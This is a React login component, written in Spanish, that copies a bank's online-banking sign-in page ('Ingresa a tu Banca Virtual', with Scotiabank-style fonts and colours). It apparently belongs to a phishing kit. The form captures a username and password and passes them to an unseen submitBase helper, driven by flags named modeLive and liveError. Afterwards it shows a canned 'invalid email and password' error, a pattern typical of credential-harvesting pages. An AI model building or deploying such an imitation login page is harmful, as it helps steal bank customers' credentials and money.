import { useFormik } from 'formik'
import { useState } from 'react'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { UsernameAndPasswordError } from './UsernameAndPasswordError'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
import { useGeneralData } from '../../../hooks/useGeneralData'

const valuesData = { username: '', password: '' }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = () => {
    
    const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: false, timeLoader: 2000 })

    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameAndPasswordValidate({values, virtualKeyword: false}),
        onSubmit: async(valuesData, {resetForm}) => {
            // Descomentar si quieres un tipo de documento
            // valuesData.typeDocument = selectItem
            submitBase({dataImportant, valuesData}) 
            return resetForm()
        }
    })
    
    return (
        <>
            {
                dataImportant.showSpiner === true ? <Spiner /> : (
                    <>
                        {/* Aqui ira las notificacion de error en caso general */}

                        {/* TODO: Teclado virtual */}
                        {/* <UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) */}
                        {dataImportant.liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)}
                        {/* Colocar diseño base */}
                        <div className='mt-11 mx-10 md:mt-20 md:grid md:grid-cols-12 md:gap-9'>
                            <div className='md:col-start-3 col-end-7'>
                                <p className='scotiaHeadline text-3xl text-[#333333] md:text-4xl'>Ingresa a tu Banca Virtual</p>
                                <form className='flex flex-col' onSubmit={handleSubmit}>
                                    <UsernameAndPasswordInput
                                        username={values.username.slice(0, 12)}
                                        password={values.password}
                                        handleChange={handleChange} 
                                        handleBlur={handleBlur}
                                        touched={touched}
                                        errors={errors}
                                        showPasswordMode={true}
                                        
                                        
                                        existUpper={ RegExp(/[A-Z]/).test(values.password)}
                                        existLower={ RegExp(/[a-z]/).test(values.password)}
                                        existNumber={RegExp(/[0-9]/).test(values.password)}
                                        existLength={values.password.length >= 8}
                                    />
            
                                    <button
                                        disabled={ 
                                            (

                                                (touched.username && errors.username == undefined)
                                                &&
                                                (touched.password && errors.password == undefined)  
                                            ) == true &&
                                            (
                                                RegExp(/[A-Z]/).test(values.password) &&
                                                RegExp(/[a-z]/).test(values.password) &&
                                                RegExp(/[0-9]/).test(values.password) &&
                                                values.password.length >= 8
                                            ) == false
                                            ? true 
                                            : false
                                        }
                                        type='submit'
                                        className='
                                            transition-all mt-7 bg-[#ec111a] rounded-lg py-4 text-lg text-white scotiaBold
                                            hover:bg-[#be061b] hover:text-white'
                                    >
                                        Ingresar
                                    </button>
            
                                </form>
                            </div>
        
                            <div className='hidden md:flex md:col-start-7 col-end-8 justify-center'>
                                <hr className='border-r-2 h-full' />
                            </div>
            
                            <div className='flex flex-col gap-4 mt-11 md:col-start-8 col-end-11 md:justify-center' >
                                <p className='text-[#333333] scotiaBold text-2xl'>¿No te has registrado?</p>
                                <button 
                                    className='
                                        border-[1px] border-[#ec111a] rounded-lg py-4 text-lg text-[#ec111a] scotiaBold w-full transition-all 
                                        hover:bg-[#be061b] hover:border-[#be061b] hover:text-white'
                                >
                                Regístrate aquí
                                </button>
                            </div>
                        </div>
                    </>
                )
            }
        </>
            
    )
}
